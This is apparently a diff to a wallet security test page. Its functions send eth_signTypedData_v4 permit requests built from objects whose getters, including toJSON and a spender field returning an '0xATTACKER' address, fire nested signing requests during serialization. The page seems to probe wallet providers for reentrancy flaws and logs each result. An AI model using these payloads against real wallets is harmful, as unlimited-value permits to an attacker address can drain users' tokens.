+            .then(s => log('REENTER', 'real-reenter · nested sig', { s }))
+            .catch(e => log('REENTER', 'real-reenter · nested err', { message: e.message, code: e.code }));
+        }
+        return '0xATTACKER0000000000000000000000000000';
+      },
+      value: 'MAX',
+      owner: from,
+      nonce: 0,
+      deadline: 9999999999,
+    };
+    log('REQ', 'real-reenter · sending', { depth });
+    const sig = await window.ethereum.request({
+      method: 'eth_signTypedData_v4',
+      params: [from, p],
+    });
+    log('OK', 'real-reenter · sig', { sig, depth });
+    outLast({ sig, depth });
+  } catch (e) {
+    log('ERR', 'real-reenter', { message: e.message, code: e.code, depth: '—' });
+    outLast({ err: e.message, code: e.code });
+  }
+}
+
+async function p_real_toJSON() {
+  if (!window.ethereum) return outLast('no ethereum');
+  try {
+    const from = await getAccount();
+    window._FROM = from;
+    log('ENV', 'real-toJSON · account', { from });
+    let depth = 0;
+    const base = permitBase();
+    const p = {
+      domain: base.domain,
+      types: base.types,
+      primaryType: base.primaryType,
+      message: base.message,
+      get toJSON() {
+        depth++;
+        if (depth === 1) {
+          log('REENTER', 'real-toJSON · nested request', { depth });
+          window.ethereum.request({ method: 'eth_signTypedData_v4', params: [from, permitBase()] })
+            .then(s => log('REENTER', 'real-toJSON · nested sig', { s }))
+            .catch(e => log('REENTER', 'real-toJSON · nested err', { message: e.message, code: e.code }));
+        }
+        return () => base;
+      },
+    };
+    log('REQ', 'real-toJSON · sending', { depth });
+    const sig = await window.ethereum.request({
+      method: 'eth_signTypedData_v4',
+      params: [from, p],
+    });
+    log('OK', 'real-toJSON · sig', { sig, depth });
+    outLast({ sig, depth });
+  } catch (e) {
+    log('ERR', 'real-toJSON', { message: e.message, code: e.code, depth: '—' });
+    outLast({ err: e.message, code: e.code });
+  }
+}
+
+/* ─────────────  env + boot  ───────────── */
+
+function renderEnv() {
   document.getElementById('env').innerHTML = `
-    <b>origin</b><span>${ORIGIN}</span>
-    <b>ethereum</b><span>${IS_REAL}</span>
-    <b>isTrust</b><span>${IS_REAL && window.ethereum.isTrust}</span>
-    <b>from</b><span>${FROM || '—'}</span>
-    <b>chainId</b><span>${CHAIN}</span>`;
-  document.getElementById('state').innerHTML = `
-    <b>from</b><span>${FROM||'—'}</span>
-    <b>chain</b><span>${CHAIN}</span>`;
+    <b>location.origin</b><span>${ORIGIN}</span>
+    <b>window.ethereum</b><span class="badge ${IS_REAL ? 'on' : 'off'}">${IS_REAL ? 'present' : 'absent'}</span>
+    <b>isTrust</b><span>${IS_REAL && window.ethereum.isTrust ? 'yes' : 'no'}</span>
+  `;
+  if (IS_REAL) {
+    ['btn_real_stack','btn_real_reenter','btn_real_toJSON'].forEach(id => {
+      document.getElementById(id).disabled = false;
+    });
+  }
 }
 
 renderEnv();
-log('BOOT','toctou max up',{origin:ORIGIN,real:IS_REAL});
+log('BOOT', 'permit-alt bench up', { origin: ORIGIN, real: IS_REAL });
 </script>
 </body>
 </html>
